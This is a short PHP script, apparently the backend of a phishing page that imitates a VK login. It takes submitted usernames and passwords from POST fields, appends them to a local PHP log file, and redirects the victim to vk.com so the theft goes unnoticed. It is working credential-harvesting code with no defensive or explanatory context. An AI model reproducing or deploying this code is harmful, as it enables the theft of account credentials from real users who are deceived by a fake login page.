$Login = $_POST['ser']; 
$Pass = $_POST['res']; 
$log = fopen("file2332453345.php","a+"); 
fwrite($log,"<br> $Login:$Pass \n"); 
fclose($log); //закрываем
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=vk.com'></head></html>"; 
?> 